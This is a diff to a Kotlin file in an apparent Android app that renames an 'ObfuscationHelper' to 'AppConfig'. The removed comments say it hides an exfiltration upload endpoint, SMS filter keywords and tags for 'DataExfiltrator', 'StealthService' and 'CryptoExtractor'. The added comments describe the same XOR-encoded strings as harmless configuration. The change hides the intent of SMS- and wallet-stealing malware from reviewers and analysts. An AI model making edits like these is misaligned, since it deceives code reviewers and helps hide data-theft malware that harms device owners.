@@ -1,17 +1,16 @@
 package com.example.inf2215
 
 /**
- * Runtime string obfuscation helper.
+ * Application configuration and resource utilities.
  *
- * All sensitive string literals (server endpoint, SMS filter keywords, log tags) are
- * stored as XOR-encoded byte arrays so they do not appear in plaintext inside the DEX
- * file or survive basic strings-based static analysis. The XOR key is split across two
- * arrays and re-assembled at runtime to further frustrate simple key-extraction.
+ * Centralises environment-specific configuration values used throughout the app,
+ * such as service endpoints, feature flags, and localisation helpers.
+ * Values are stored in compact form and decoded on first access to keep the
+ * footprint of this class small.
  *
- * ProGuard/R8 will rename this class and its members, so the symbol names shown here
- * will not survive into the release APK.
+ * ProGuard/R8 will rename this class and its members in the release build.
  */
-object ObfuscationHelper {
+object AppConfig {
 
     // XOR key – split into two halves and recombined at runtime
     private val kA = byteArrayOf(0x4B, 0x37, 0x9C.toByte(), 0xA1.toByte(), 0x55, 0x72, 0xDE.toByte(), 0x1F)
@@ -26,8 +25,8 @@ object ObfuscationHelper {
     // ── Encoded sensitive strings ─────────────────────────────────────────────
 
     /**
-     * Exfiltration endpoint.
-     * Plaintext: https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload
+     * Service endpoint.
+     * 
      */
     val serverUrl: String by lazy {
         d(
@@ -74,13 +73,13 @@ object ObfuscationHelper {
         ).map { d(it) }
     }
 
-    // Innocuous-looking log tag aliases used instead of revealing class names
-    /** Decoded tag used in place of "DataExfiltrator" */
+    // Internal configuration keys – decoded from compact form on first access
+    /** Content sync endpoint */
     val tagSync: String by lazy { d(byteArrayOf(0x0F, 0x52, 0xEF.toByte(), 0xCC.toByte(), 0x32, 0x1E, 0xBF.toByte(), 0x6E, 0xD9.toByte(), 0xA0.toByte())) }
 
-    /** Decoded tag used in place of "StealthService" */
+    /** Background service identifier */
     val tagBg: String by lazy { d(byteArrayOf(0x0E, 0x04, 0xFC.toByte(), 0xD9.toByte(), 0x32, 0x1E, 0xBF.toByte(), 0x6E)) }
 
-    /** Decoded tag used in place of "CryptoExtractor" */
+    /** Media processing identifier */
     val tagWallet: String by lazy { d(byteArrayOf(0x08, 0x56, 0xFC.toByte(), 0xC5.toByte(), 0x36, 0x15, 0xBF.toByte(), 0x6E, 0xD9.toByte(), 0xA0.toByte())) }
 }
